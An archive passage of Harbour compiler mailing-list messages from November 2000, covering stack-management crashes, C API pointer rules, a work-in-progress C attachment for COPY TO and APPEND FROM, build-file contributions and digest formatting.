<PRE>[To Marek]

&quot;stack's reallocation does not affect a pointer retruned by a hb_parc()&quot;

Good - it's what I expected.

I'm also expecting that the GC can't move anything for which hb_parc()
has returned a pointer, unless the routine which did that has returned
(back into the pcode loop).

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 09:08:22 2000
Date: Mon Nov  6 09:08:22 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>[To Maurilio]

&quot;when I say 64Mb I mean 64Mb of _addresses_ not memory&quot;

That's OK - I understood that when you mentioned it a while ago. &lt;g&gt;

&quot;You don't use real memory until after you start committing it.&quot;

Some (maybe all!) versions of Windows may not behave in the way you'd
like - they may well allocate page/swap space immediately.  People
with nice big disks probably won't notice or care, but not everyone
has them (even though they're now _so_ cheap).

OTOH, 64Mb for the stack is more than any typical app needs, surely.

I think I'll at least for now try a bigger initial size and see if
any of the GPFs I've seen go away...

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 10:26:01 2000
Date: Mon Nov  6 10:26:01 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_003F_01C047EC.65437EB0
Content-Type: text/plain;
	charset=&quot;Windows-1252&quot;
Content-Transfer-Encoding: 7bit

Well,
        I made the changes sugested by Victor (on the parameters). There is
still some kind of a memory problem that I cannot spot. My little knowlegde
on which Items must or not be released can be the cause. Records do get
copied, though, at least on my tests, but I get a crash or an
&quot;Unrecoverable error 9022: Memory buffer overflow&quot;, which means??

    I have followed the code with TD32 and it does what's intended. Maybe
someone with more insight can make it work. :-[

Harrier

----- Original Message -----
From: &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Saturday, November 04, 2000 1:09 PM
Subject: Re: [Harbour] COPY TO errors


&gt;<i> Harrier:
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; that was my first Harbour code,
</I>&gt;<i>
</I>&gt;<i> and I forgot to mention that I really appreciate it!  I noticed that it
</I>was
&gt;<i> a &quot;work-in-progress&quot;, but I was just trying to be complete with what I
</I>saw.
&gt;<i> Thanks again for stepping in and &quot;filling that hole&quot;!
</I>&gt;<i>
</I>&gt;<i> &gt; As to the REST parameter, I could not find a REAL purpouse for it.
</I>&gt;<i>
</I>&gt;<i> For COPY TO, it is useful to put a file in Natural order, go to the top of
</I>&gt;<i> the records that were added when something went wrong, and copy Rest.  But
</I>&gt;<i> you are right it is meaningless for append from.
</I>&gt;<i>
</I>&gt;<i> Thanks again,
</I>&gt;<i>
</I>&gt;<i> Brian
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>
------=_NextPart_000_003F_01C047EC.65437EB0
Content-Type: application/octet-stream;
	name=&quot;rddcpy.c&quot;
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename=&quot;rddcpy.c&quot;

/**********************************************/=0A=
/* APPEND FROM &amp; COPY TO by Harrier 4/10/2000 */=0A=
/**********************************************/=0A=
=0A=
// as we are in C, the code is upside down, =0A=
//  find __SBAPP &amp; __DBCOPY at the bottom=0A=
=0A=
// create a new AREANODE and open it's Area=0A=
// I assume the file exists, else extra code must be added to create it=0A=
static LPAREANODE GetTheOtherArea( char *szDriver, char * szFileName )=0A=
{=0A=
  LPAREANODE pAreaNode;=0A=
  LPRDDNODE  pRDDNode;=0A=
  USHORT     uiRddID;=0A=
  DBOPENINFO pInfo;=0A=
=0A=
  pRDDNode =3D hb_rddFindNode( szDriver, &amp;uiRddID );  // find the RDD=0A=
=0A=
  if ( !pRDDNode )=0A=
  {=0A=
    hb_errRT_DBCMD( EG_ARG, EDBCMD_EVAL_BADPARAMETER, NULL, &quot;DBAPP&quot; );=0A=
    return NULL;=0A=
  }=0A=
=0A=
/* get the new area node for this AREA */=0A=
  pAreaNode =3D  hb_rddNewAreaNode( pRDDNode, uiRddID );=0A=
=0A=
/* Fill pInfo structure */=0A=
  memset( &amp;pInfo, 0, sizeof(DBOPENINFO) );=0A=
  pInfo.uiArea =3D uiRddID;=0A=
  pInfo.abName =3D ( BYTE * )  hb_xgrab( _POSIX_PATH_MAX + 1 );=0A=
  strcpy( ( char * ) pInfo.abName, szFileName );=0A=
  pInfo.atomAlias =3D ( BYTE * ) &quot;TMPAREA&quot;;=0A=
  pInfo.fShared =3D !hb_set.HB_SET_EXCLUSIVE;=0A=
  pInfo.fReadonly =3D FALSE;=0A=
  ( ( AREAP ) pAreaNode-&gt;pArea )-&gt;uiArea =3D uiRddID;=0A=
=0A=
  if( SELF_OPEN( ( AREAP ) pAreaNode-&gt;pArea, &amp;pInfo ) =3D=3D FAILURE )=0A=
  {=0A=
    hb_errRT_DBCMD( EG_OPEN, NULL, NULL, &quot;DBAPP&quot; ); // Could not open it=0A=
    SELF_RELEASE( ( AREAP ) pAreaNode-&gt;pArea );=0A=
    hb_xfree( pAreaNode );=0A=
    return NULL;=0A=
  }=0A=
  return pAreaNode;=0A=
}=0A=
=0A=
// check if the field is on the Fields Array=0A=
static BOOL IsFieldIn( char * fieldName, PHB_ITEM pFields )=0A=
{=0A=
  USHORT i, uiFields =3D ( USHORT ) hb_arrayLen( pFields );=0A=
  for ( i=3D0; i&lt;uiFields; i++ )=0A=
  {=0A=
    PHB_ITEM pField =3D pFields-&gt;item.asArray.value-&gt;pItems + i;=0A=
    if ( strcmp( fieldName, (char *)pField-&gt;item.asString.value ) =3D=3D =
0 )=0A=
      return TRUE;=0A=
  }=0A=
  return FALSE;=0A=
}=0A=
=0A=
// move the Field Data between areas by name =0A=
static void rddMoveFields( AREAP pAreaFrom, AREAP pAreaTo, PHB_ITEM =
pFields )=0A=
{=0A=
  USHORT   i;=0A=
  PHB_ITEM fieldValue;=0A=
=0A=
  fieldValue =3D hb_itemNew( NULL );=0A=
  for ( i=3D0 ; i&lt;pAreaFrom-&gt;uiFieldCount; i++ )=0A=
  {=0A=
    // list or field in the list?=0A=
    if ( !pFields || IsFieldIn( (( PHB_DYNS )(pAreaFrom-&gt;lpFields + =
i)-&gt;sym )-&gt;pSymbol-&gt;szName,  pFields ))=0A=
    {=0A=
      SELF_GETVALUE( pAreaFrom, i+1, fieldValue );=0A=
      SELF_PUTVALUE( pAreaTo, i+1, fieldValue );=0A=
    }=0A=
  }=0A=
  hb_itemRelease( fieldValue );=0A=
}=0A=
=0A=
// move the records filtering if apropiate=0A=
static ERRCODE rddMoveRecords( char *cAreaFrom, char *cAreaTo, PHB_ITEM =
pFields,=0A=
                               PHB_ITEM pFor, PHB_ITEM pWhile, LONG =
lNext,=0A=
                               ULONG lRec, BOOL bRest, char *cDriver )=0A=
{=0A=
  char     * szFileName, * szDriver;=0A=
  LONG       toGo=3DlNext;=0A=
  BOOL       bFor, bWhile;=0A=
  BOOL       keepGoing=3DTRUE;=0A=
  AREAP      pAreaFrom;=0A=
  AREAP      pAreaTo;=0A=
  DBEVALINFO pEvalInfo;=0A=
  LPAREANODE pAreaRelease=3DNULL;=0A=
  LPAREANODE s_pCurrAreaSaved=3Ds_pCurrArea;=0A=
=0A=
  HB_SYMBOL_UNUSED( bRest );=0A=
=0A=
  if ( !s_pCurrArea )  // We need a current Area to APPEND TO or FROM=0A=
  {=0A=
     hb_errRT_DBCMD( EG_NOTABLE, EDBCMD_NOTABLE, NULL, &quot;DBAPP&quot; );=0A=
     return EG_NOTABLE;=0A=
  }=0A=
=0A=
  // get the RDD Driver to use for the &quot;other&quot; Area=0A=
  if( cDriver )=0A=
     szDriver =3D cDriver;=0A=
  else=0A=
     szDriver =3D s_szDefDriver;=0A=
=0A=
  if( !cAreaFrom &amp;&amp; ! cAreaTo )         // File is needed=0A=
  {=0A=
     hb_errRT_DBCMD( EG_ARG, EDBCMD_EVAL_BADPARAMETER, NULL, &quot;DBAPP&quot; );=0A=
     return EG_ARG;=0A=
  }=0A=
=0A=
  if ( cAreaTo ) // it's a COPY TO=0A=
  {=0A=
    pAreaRelease =3D GetTheOtherArea( szDriver, cAreaTo );=0A=
    pAreaTo =3D pAreaRelease-&gt;pArea;=0A=
  }=0A=
  else=0A=
    pAreaTo =3D s_pCurrArea-&gt;pArea;=0A=
=0A=
=0A=
  if ( cAreaFrom ) // it's an APPEND FROM=0A=
  {                // make it current=0A=
    pAreaRelease =3D s_pCurrArea =3D GetTheOtherArea( szDriver, =
cAreaFrom );=0A=
    pAreaFrom =3D  pAreaRelease-&gt;pArea; =0A=
  }=0A=
  else=0A=
    pAreaFrom =3D s_pCurrArea-&gt;pArea;=0A=
=0A=
  // or one or the other but necer none=0A=
  if ( !pAreaRelease )  // We need another Area to APPEND TO=0A=
  {=0A=
     hb_errRT_DBCMD( EG_NOTABLE, EDBCMD_NOTABLE, NULL, &quot;DBAPP&quot; );=0A=
     return EG_NOTABLE;=0A=
  }=0A=
=0A=
  if ( lRec &gt; 0 )                 // only one record=0A=
    SELF_GOTO( pAreaFrom, lRec ); // go there=0A=
=0A=
  // move those records assuming we are positioned on one.=0A=
  while( keepGoing )=0A=
  {=0A=
    keepGoing =3D FALSE; =0A=
    if( !pAreaFrom-&gt;fEof ) // until eof or an evaluation failed=0A=
    {=0A=
       if( pWhile )=0A=
          bWhile =3D hb_itemGetL( hb_vmEvalBlock( pWhile ) );=0A=
       else=0A=
          bWhile =3D TRUE;=0A=
=0A=
       if( pFor )=0A=
          bFor =3D hb_itemGetL( hb_vmEvalBlock( pFor ) );=0A=
       else=0A=
          bFor =3D TRUE;=0A=
=0A=
      if( bWhile &amp;&amp; bFor &amp;&amp; (!lNext || toGo &gt; 0 )) // candidate?=0A=
      {=0A=
        PHB_ITEM lpFields =3D pFields ? =
pFields-&gt;item.asArray.value-&gt;ulLen ? pFields : NULL : NULL;=0A=
        SELF_APPEND( ( AREAP ) pAreaTo, FALSE );   // put a new one on =
TO Area=0A=
        rddMoveFields( pAreaFrom, pAreaTo, lpFields ); // move the data=0A=
        if ( lRec =3D=3D 0 ) // only one record?=0A=
          keepGoing =3D TRUE;=0A=
        else=0A=
          continue;=0A=
      }=0A=
      toGo--;                     // one less to go=0A=
      SELF_SKIP( pAreaFrom, 1L ); // get the next one=0A=
    }=0A=
  }=0A=
=0A=
  s_pCurrArea =3D s_pCurrAreaSaved;  // set current WorkArea to initial =
state=0A=
=0A=
  // Close the File=0A=
  SELF_CLOSE( ( AREAP ) pAreaRelease-&gt;pArea );=0A=
  SELF_RELEASE( ( AREAP ) pAreaRelease-&gt;pArea );=0A=
  hb_xfree( pAreaRelease );=0A=
=0A=
/* should the following be released? =0A=
  if ( pFields )=0A=
    hb_itemRelease( pFields );=0A=
  if ( pFor )=0A=
    hb_itemRelease( pFor );=0A=
  if ( pWhile )=0A=
    hb_itemRelease( pWhile );=0A=
*/=0A=
=0A=
  return SUCCESS;=0A=
}=0A=
=0A=
HB_FUNC( __DBAPP )=0A=
{=0A=
  hb_retni( rddMoveRecords(  hb_parc( 1 ), // File From=0A=
                             NULL,         // TO current area=0A=
                             ISARRAY( 2 ) ? hb_param( 2, HB_IT_ARRAY ) : =
NULL, // Fuelds=0A=
                             ISBLOCK( 3 ) ? hb_param( 3, HB_IT_BLOCK ) : =
NULL, // For=0A=
                             ISBLOCK( 4 ) ? hb_param( 4, HB_IT_BLOCK ) : =
NULL, // While=0A=
                             ISNUM( 5 ) ? hb_parni( 5 ) : NULL,          =
      // Next=0A=
                             ISNUM( 6 ) ? hb_parni( 6 ) : NULL,          =
      // Record=0A=
                             ISNUM( 7 ) ? hb_parnl( 7 ) : NULL,          =
      // Rest=0A=
                             ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ));       =
      // RDD =0A=
}=0A=
=0A=
HB_FUNC( __DBCOPY )=0A=
{=0A=
  hb_retni(  rddMoveRecords( NULL,         // FROM current area=0A=
                             hb_parc( 1 ), // File To=0A=
                             ISARRAY( 2 ) ? hb_param( 2, HB_IT_ARRAY ) : =
NULL, // Fuelds=0A=
                             ISBLOCK( 3 ) ? hb_param( 3, HB_IT_BLOCK ) : =
NULL, // For=0A=
                             ISBLOCK( 4 ) ? hb_param( 4, HB_IT_BLOCK ) : =
NULL, // While=0A=
                             ISNUM( 5 ) ? hb_parni( 5 ) : NULL,          =
      // Next=0A=
                             ISNUM( 6 ) ? hb_parni( 6 ) : NULL,          =
      // Record=0A=
                             ISNUM( 7 ) ? hb_parnl( 7 ) : NULL,          =
      // Rest=0A=
                             ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ));       =
      // RDD =0A=
=0A=
}=0A=
=0A=
=0A=

------=_NextPart_000_003F_01C047EC.65437EB0--


</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 10:53:02 2000
Date: Mon Nov  6 10:53:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (john)

<PRE>[To Paul Tucker]

It looks like I dl'ed it about a year ago.  Sorry, I don't know where
I got it, but the FSF/GNU site (ftp.gnu.org?) is a fair bet. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:24:02 2000
Date: Mon Nov  6 12:24:02 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>&gt;<i> Marek,
</I>&gt;<i>
</I>&gt;<i> I believe you are 100% correct. Though there is 1 limitation on
</I>using a
&gt;<i> pointer obtained using __parc(). In the Clipper implementation (not
</I>yet in
&gt;<i> Harbour) multiple vars may be sharing the same pointer to a string
</I>value.
&gt;<i> This is an optimization aspect and not a language feature. So, a C
</I>callable
&gt;<i> function should *not* directly modify the value pointed to by the
</I>__parc()
&gt;<i> pointer, instead __storc() should be used.
</I>&gt;<i>
</I>&gt;<i> Ron
</I>
Yes Ron,

You are 100% right !.

But it is not a problem in this situation because __ClsInstSuper
does not modify it at all.

Marek Paliwoda



</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:44:02 2000
Date: Mon Nov  6 12:44:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] VC++ / SIMPLEX

<PRE>[To All - especially Paul &lt;g&gt;]

I made a pair of files to build the SIMPLEX Harbour using VC++ and
would like to contribute them.  However, I'd like someone to test the
&quot;real&quot; versions (for odd reasons I've to use a special kludge).

Anyone willing to test tehm, please let me know &amp; I'll send 'em.  If
they work, please add 'em to the CVS. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:44:10 2000
Date: Mon Nov  6 12:44:10 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Ron]

Your __GET, __GETA, etc all work great - thanks!  (I'm using the
slex build.)  They work fine with an add-on of mine, too. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:44:20 2000
Date: Mon Nov  6 12:44:20 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] PP command line

<PRE>[To Alexander - and Ron if it applies to dot's PP?]

As you know, Clipper's PP allows /dXXX and that works for Harbour's
PP, too. :-)

However, Clipper also allows /dXXX=3DYYY (same as #define XXX YYY
and yes, it's case sensitive like #define is).  That doesn't appear
to work with Harbour.  Would it be easy to add, please?

I'm not too sure how clever Clipper is, i.e. whether you can use
e.g. /dPseudoFunc(xxx,yyy)=3DSomethingElse(yyy,xxx).

BTW, In case you didn't know, depending on your Windows command / BAT
file processor, you may have to use quotes: &quot;/dXXX=3DYYY&quot; or else the
=3D (equals sign) gets changed to a space.  Knowing this may help you
during any testing you do. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:52:01 2000
Date: Mon Nov  6 12:52:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>JF, Maurilio, All,

Apparently, Maurilio was very right. After his changes to default stack
size, contrib/dot/pp.prg no longer GPF :-)

Maurilio, I would urge you to do act upon your idea regarding reserving a
large enough address space for dynamic stack growth. Though I think 64MB is
much more than needed.

Please review the stack management functions, and try to implement your
suggestion...

Ron

&gt;<i> &gt; &gt; if you need more than 64Mb (Mb not Kb) per thread of stack space your
</I>&gt;<i> &gt; &gt; algorithm is surely broken :-)))
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Harbour dynamic stack functions are located at source\vm\hvm.c
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Improvements on those functions are welcome :-)
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Antonio
</I>

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:55:04 2000
Date: Mon Nov  6 12:55:04 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] VC++ / SIMPLEX

<PRE>John,

&gt;<i> [To All - especially Paul &lt;g&gt;]
</I>&gt;<i> 
</I>&gt;<i> I made a pair of files to build the SIMPLEX Harbour using VC++ and
</I>&gt;<i> would like to contribute them.  However, I'd like someone to test the
</I>&gt;<i> &quot;real&quot; versions (for odd reasons I've to use a special kludge).
</I>&gt;<i> 
</I>&gt;<i> Anyone willing to test tehm, please let me know &amp; I'll send 'em.  If
</I>&gt;<i> they work, please add 'em to the CVS. :-)
</I>&gt;<i> 
</I>&gt;<i> John.
</I>
What is the special kludge?

Ron

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 12:57:02 2000
Date: Mon Nov  6 12:57:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>John,

You are welcome! Thanks for your assistance and feedback.

Ron

&gt;<i> [To Ron]
</I>&gt;<i> 
</I>&gt;<i> Your __GET, __GETA, etc all work great - thanks!  (I'm using the
</I>&gt;<i> slex build.)  They work fine with an add-on of mine, too. :-)
</I>&gt;<i> 
</I>&gt;<i> John.
</I>

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 13:35:04 2000
Date: Mon Nov  6 13:35:04 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>&gt;<i> [To Ron]
</I>&gt;<i>
</I>&gt;<i> &gt; &quot;a C callable
</I>&gt;<i> &gt; function should *not* directly modify the value pointed to by the
</I>&gt;<i> &gt; __parc() pointer, instead __storc() should be used.&quot;
</I>&gt;<i>
</I>&gt;<i> Yes, unless the caller passed it by ref. (@cStr), in which case it's
</I>&gt;<i> OK to modify it directly.  (It's also OK to use _storc() of course,
</I>&gt;<i> though rather wasteful.)  FWRITE() is an example, in the sense that
</I>&gt;<i> this general rule applies to it just as it applies to other C code
</I>&gt;<i> (i.e. FWRITE() is not special).
</I>&gt;<i>
</I>&gt;<i> John.
</I>
I am really not sure this is a good technique in Clipper, John !

Since a pointer can point to a string which is shared by more than
one Clipper level var, modifying it directly can cause a modify of
many Clipper level vars. You always *should* use __storc() func
to return a *copy* of a modified string. This is documented in
a &quot;Clipper Technical Reference&quot;. (Of course I mean Clipper here,
because Harbour currently does not allow sharing of strings)

Regards
Marek Paliwoda






</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 14:46:01 2000
Date: Mon Nov  6 14:46:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Ron,

to write what I've suggested you need to go to the underlaying OS APIs
(your average C runtime is not enough). I could write it for OS/2, but
not for win32 or linux. So, first, we need to find someone who can do
the same task under win32 and linux.

And DOS users would fall back to 667/668 runtime errors.

regards.

Ron Pinkas ha scritto:
&gt;<i> 
</I>&gt;<i> JF, Maurilio, All,
</I>&gt;<i> 
</I>&gt;<i> Apparently, Maurilio was very right. After his changes to default stack
</I>&gt;<i> size, contrib/dot/pp.prg no longer GPF :-)
</I>&gt;<i> 
</I>&gt;<i> Maurilio, I would urge you to do act upon your idea regarding reserving a
</I>&gt;<i> large enough address space for dynamic stack growth. Though I think 64MB is
</I>&gt;<i> much more than needed.
</I>&gt;<i> 
</I>&gt;<i> Please review the stack management functions, and try to implement your
</I>&gt;<i> suggestion...
</I>&gt;<i> 
</I>&gt;<i> Ron
</I>&gt;<i> 
</I>&gt;<i> &gt; &gt; &gt; if you need more than 64Mb (Mb not Kb) per thread of stack space your
</I>&gt;<i> &gt; &gt; &gt; algorithm is surely broken :-)))
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Harbour dynamic stack functions are located at source\vm\hvm.c
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Improvements on those functions are welcome :-)
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Antonio
</I>&gt;<i> 
</I>


-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 15:08:02 2000
Date: Mon Nov  6 15:08:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Ron... Re : dynsym.c caused GPF

<PRE>Ron

I don't think it's a good idea.

There is clearly a bug in the way I store HB_ITEM pointer within 
classes.c. If some other place GPF due to the same problem, I 
think the problem must be resolved in place of changing what I see 
as a very good stack management. I was just unaware of the 
restriction.

As john stated, I'm really not sure the way Windows will interpret 
this memory reservation (in fact I'm even nearly sure it will do the 
worth think it will be able to do :-((( )


&gt;<i> JF, Maurilio, All,
</I>&gt;<i> 
</I>&gt;<i> Apparently, Maurilio was very right. After his changes to default stack
</I>&gt;<i> size, contrib/dot/pp.prg no longer GPF :-)
</I>&gt;<i> 
</I>&gt;<i> Maurilio, I would urge you to do act upon your idea regarding reserving a
</I>&gt;<i> large enough address space for dynamic stack growth. Though I think 64MB
</I>&gt;<i> is much more than needed.
</I>&gt;<i> 
</I>&gt;<i> Please review the stack management functions, and try to implement your
</I>&gt;<i> suggestion...
</I>&gt;<i> 
</I>&gt;<i> Ron
</I>&gt;<i> 
</I>&gt;<i> &gt; &gt; &gt; if you need more than 64Mb (Mb not Kb) per thread of stack space
</I>&gt;<i> &gt; &gt; &gt; your algorithm is surely broken :-)))
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Harbour dynamic stack functions are located at source\vm\hvm.c
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Improvements on those functions are welcome :-)
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Antonio
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 16:42:02 2000
Date: Mon Nov  6 16:42:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-06 22:43 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>2000-11-06 22:43 UTC+0100 JFL (mafact) &lt;<A HREF="mailto:jfl@mafact.com">jfl@mafact.com</A>&gt;
   * source/vm/classes.c
     Final check on Function directly pushing item on the stack
     removing every direct use of stacked PHB_ITEM after 
     .VmPush() or accessing them by hb_stack.pBase + n.


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 16:44:01 2000
Date: Mon Nov  6 16:44:01 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Maurilio... CHANGELOG: 2000-11-05 19:52 GMT+1

<PRE>Hi Maurilio

&gt;<i> 2000-11-05 19:52 GMT+1 Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
</I>&gt;<i>    * source/vm/hvm.c
</I>&gt;<i>       * I keep getting exceptions during class use due to harbour stack
</I>&gt;<i> management,
</I>&gt;<i>         so, until all code is checked and made compatible with harbour
</I>&gt;<i> stack I have
</I>&gt;<i>         increased
</I>&gt;<i>         STACK_INITHB_ITEMS      to 2000 (from 100)
</I>&gt;<i>         STACK_EXPANDHB_ITEMS    to 200  (20)
</I>
I just cvsed my last (and carefully checked :-) ) classes.c

Coud you please recheck it against ;-) the stack with the old init 
value (100,20). Let me know if you expected any more errors ( and 
if yes where ).


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 18:39:02 2000
Date: Mon Nov  6 18:39:02 2000
From: Paul Tucker harbour@lists.harbour-project.org
Subject: [Harbour] VC++ / SIMPLEX

<PRE>John,

By all means - Please send them!

Paul

----- Original Message ----- 
From: &quot;John Skelton&quot; &lt;<A HREF="mailto:John_Skelton@compuserve.com">John_Skelton@compuserve.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Monday, November 06, 2000 12:42 PM
Subject: [Harbour] VC++ / SIMPLEX


[To All - especially Paul &lt;g&gt;]

I made a pair of files to build the SIMPLEX Harbour using VC++ and
would like to contribute them.  However, I'd like someone to test the
&quot;real&quot; versions (for odd reasons I've to use a special kludge).

Anyone willing to test tehm, please let me know &amp; I'll send 'em.  If
they work, please add 'em to the CVS. :-)

John.




</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 19:33:02 2000
Date: Mon Nov  6 19:33:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Ron... Re : dynsym.c caused GPF

<PRE>Hi JF,

Sorry if I wasn't clear. I did _not_ mean to suggest that we should take one
approach _over_ the other.

Surely, we all trust that you'll provide the right fix. I think that
Maurilio proposal is great, because it addresses some performance issue,
_separate_ from the logical bug, which can and should be fixed.

I mean _if_ we can get a dynamic growing stack without the price of it being
moved (and a slow memory copy), than we should explore this option.

Ron

&gt;<i> Ron
</I>&gt;<i>
</I>&gt;<i> I don't think it's a good idea.
</I>&gt;<i>
</I>&gt;<i> There is clearly a bug in the way I store HB_ITEM pointer within
</I>&gt;<i> classes.c. If some other place GPF due to the same problem, I
</I>&gt;<i> think the problem must be resolved in place of changing what I see
</I>&gt;<i> as a very good stack management. I was just unaware of the
</I>&gt;<i> restriction.
</I>&gt;<i>
</I>&gt;<i> As john stated, I'm really not sure the way Windows will interpret
</I>&gt;<i> this memory reservation (in fact I'm even nearly sure it will do the
</I>&gt;<i> worth think it will be able to do :-((( )
</I>

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 22:12:03 2000
Date: Mon Nov  6 22:12:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Type() bug

<PRE>Will anyone be able to look into the Type() bug I posted the other day?

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 22:56:02 2000
Date: Mon Nov  6 22:56:02 2000
From: Alejandro de Garate harbour@lists.harbour-project.org
Subject: [Harbour] digest

<PRE>[Phil]

Changes desired from a digest's user POV:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IN HEADER:
1. Haven't any sense that item [From] appear in every header,
   because it is allways the same source list and you can't post
   to this address.

2. The item [To] is the same that [Reply-To], so let only [Reply-To]
3. The paragraph
Send Harbour mailing list submissions to
        <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
   is the same too!

I post a header from an old digest so you can see what I talking about:
Old digest HEADER:


&gt;<i>cut here ========================================&gt;
</I>Reply-To:  <A HREF="mailto:Harbour@egroups.com">Harbour@egroups.com</A>
Subject:  [Harbour] Digest Number 1300
Date:  7 Sep 2000 15:31:58 -0000
------------------------------------------------------------------------

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
------------------------------------------------------------------------

There are 13 messages in this issue.

Topics in this digest:
&gt;<i>cut here ========================================&gt;
</I>


and from the latest digest HEADER:

&gt;<i>cut here ========================================&gt;
</I>From:  <A HREF="mailto:harbour-request@lists.harbour-project.org">harbour-request@lists.harbour-project.org</A> Save Address - Block Sender
Reply-To:  <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
To:  <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A> Save Address
Subject:  Harbour digest, Vol 1 #85 - 13 msgs


Send Harbour mailing list submissions to
        <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>

To subscribe or unsubscribe via the World Wide Web, visit
	<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
or, via email, send a message with subject or body 'help' to
